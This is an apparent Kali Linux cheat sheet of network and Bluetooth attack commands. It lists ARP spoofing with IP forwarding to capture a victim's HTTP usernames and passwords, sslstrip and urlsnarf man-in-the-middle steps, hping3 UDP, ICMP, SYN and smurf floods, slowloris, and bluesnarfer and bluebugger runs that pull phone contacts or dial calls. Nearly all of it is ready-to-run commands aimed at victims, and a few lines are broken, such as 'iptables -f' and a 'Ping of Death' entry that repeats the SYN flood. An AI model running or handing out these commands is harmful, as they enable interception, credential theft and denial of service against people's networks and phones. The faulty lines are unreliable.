# Wireshark:

# to watch the nearby traffic we can use wireshark with Monitor mode
# but you cant watch the other frrequencies like Police wireless devices that are using other frequencies. ( not 2.4Ghz or 5Ghz)
airmon-ng start <interface name>

1. Now, open the wireshark and see all network frames on the network.
2. go > statistics > conversations
3. go > wireless > WLAN traffic

# to decrypt the SSL traffic, you should add the private key of the target or make a proxy server like burp suite and add it's certificate to wireshark.

------------------------------------------------------------

# Network Miner:

# install mono-complete (requirements of Network Miner)
apt-get install mono-complete

# install th Network Miner
wget www.netresec.com/?download=NetworkMiner -O net.zip
cd Network...
chmod +x NetworkMiner.exe
chmod -R go+w AssembledFiles/
chmod -R go+w Captures/

# to run dumpcap to get packets and receive by Network Miner
dumpcap -i <interface name> -P -w - | nc localhost 57012

-----------------------------------------------------------

# Dark Stat:

# to run Dark Stat
darkstat -i <interface name>
firefox http://127.0.0.1:667

-----------------------------------------------------------

# Kismet:

# to run kismet and start its server
# also, it can save all traffic and packets to specified files that you can reopen it in wireshark later.
kismet

-----------------------------------------------------------

# Arp Spoof:

# to flush the iptables
iptables -f

# to redirect the traffic
# not always necessary
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# to see the arp table
arp

# to see the route table
route
route -n

# finally, to run the arpspoof tool to send fake broadcast packets on the network
arpspoof -i <interface name> -t <victim IP address> <router IP address>

################################

# fast way to run an arpspoof scenario
# 1. run the arpspoof command like above to send broadcast packets to the router instead of victim.
# in this way, the victim can't receive any reply packets from the network, but we receive all the victim's traffic.
# 2. you should run the command "echo '1' > /proc/sys/net/ipv4/ip_forward" to enable the firewall to forward all the victim's traffic to internet.
# now, victim can use the internet properly and we can receive all traffic as well as victim !
# also, you can watch all HTTP plain text traffic on Wireshark and you can fetch all Username and Passwords from victim computer !
# for HTTPS packets, you can use the sslstrip command. (to read more, use Google !)

###############################

----------------------------------------------------------

# Driftnet:

# first, you should use the ettercap tool to find two target on the network and run a man-in-the-middle attack between them.

# after that, you should use driftnet command to get any image received !
driftnet -i <interface name> -bv

---------------------------------------------------------

# Urlsnarf:

# first of all, you must install websploit that isnt pre installed in Kali
apt-get install websploit

# atfer that, you should run it to start a MiTM attack
websploit
show modules
use network/mitm
show options
set interface <interface name>
set router <router IP address>
set target <victim target IP address>
set sniffer Urlsnarf
run

# now, you can watch all traffic on the victim's computer

-------------------------------------------------------

# Denial of Service:

# to saturate the bandwith of the victim:
# Volume-based DOS:

# UDP floods:
hping3 --flood --rand-source --udp -p <port number> <victim IP address>

# ICMP floods:
hping3 --flood --rand-source --icmp -p <port number> <victim IP address>

# Spoofed-packet floods:
hping3 -c 1000 -d <data size> -S -w <windows size. default is 64> -p <port number> --flood --rand-source <victim IP address>

# we can use the 'nping' and 'hping' tool to enumerate ports when the NMAP cannot detect ports.
# also, we can use it to test and detect the firewall on the target network.
# finally, we can use it to fingerprint the server and other network testing like 'traceroute'.
# So you can see that how this type of attack is going on...

# Protocol-based DOS:

# SYN floods:
hping3 -i <interface name> -S -q -d <data size> --faster -c <number of packets> <victim IP address>

# Fragmented packet floods:
hping3 -i <interface name> -f -d <data size> --faster -c <number of packets> <victim IP address>

# Ping of Death DOS:
# the last version of it was: 'ping -l 65550 -n 1000000000 <victim IP address>' that doesnt run at that time with ping command because of not enough memory.
hping3 -i <interface name> -S -q -d <data size> --faster -c <number of packets> <victim IP address>

# Smurf DDOS:
hping3 -c <number of packets. Here is 1> --icmp --spoof <victim IP address> <gateway IP address>

# Application Layer-based DOS:

# to watch open connections to the target ip address:
nc -vv <target IP address> <target port number>

# Low-and-slow attack. (slowloris)
./slowloris.pl -dns <target IP address> -p <target port number>

# Get/Post floods:
dirbuster -u <target IP address>
burpsuite (get sitemap by surfing the web pages then you can start a attack to get directories and files and something else by burpsuite.)

# to search for any exploits on your system:
searchsploit apache

# to find the exploit
locate <path of exploit got from the last command>

# Now, you can compile anyone you like to use !

-----------------------------------------------------

# Detecting Bluetooth devices:

# to find your bluethooth device:
hciconfig

# to see all details about our bluetooth device:
hciconfig -a <bluetooth interface name>

# to find all nearby devices by hcitool:
hcitool scan

# to find all nearby devices by bluelog:
bluelog -vtn

# to see dumps on bluetooth network
hcidump

# to ping one bluetooth device with mac address:
l2ping <mac address of bluetooth device>

# to find all hidden bluetooth devices by scanning all given range:
fang -r <first range-second range>

# to make change to our bluetooth dvice controller:
bluetoothctl
devices
discoverable on
pair <target mac address>

# Spooftooph

# to scan and save the list of bluetooth devices in a file:
spooftooph -i <interface name> -s -d <file name>

# to change details of our bluetooth device:
spooftooph -i <interface name> -n <new name> -a <mac address> -c <new bluetooth class>

# to read from file and spoof them:
spooftooph -i <interface name> -r <file name>

---------------------------------------------------

# BlueSmarck

# to make a DOS on the specified bluetooth device:
l2ping -s <data size> <target mac address>

# make a sequence of numbers automatically
seq 100 > <filename>

# do a DOS attack by l2ping
while read r; do l2ping -s <data size> <target mac address>; done < <above file name>

--------------------------------------------------

# BlueSnarf

# making the right configuration before start hacking!
service bluetooth stop
hciconfig hci0 down
makedir -p /dev/bluetooth/rfcomm
mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0  (virtual directory)
mknod --mode=666 /dev/refcomm0 c 216 0
hciconfig hci0 up
service bluetooth start

# to run Bluesnarfer to fetch information from phones that are vulnerable!
bluesnarfer -r <from-to (contacts range)> -b <target mac address> -c <channel number>

# maybe you need to run it for many time!

--------------------------------------------------

# BlueJack

# requirements
nano secret.txt
"this is top secret"

nano /root/Desktop/secret.txt
"this is secret for ever"

bluetooth-sendto (to send file to the device)
# if the device reject the request, it goes to check for vulnerabilities!

------------------------------------------------

# BlueBug

# requirements:
download bluebugger from the internet
cd <path>
make
make it executable
./bluebugger -a <target mac address> phonebook -c <channel number>
./bluebugger -a <target mac address> dial phonenumber -c <channel number>

----------------------------------------------


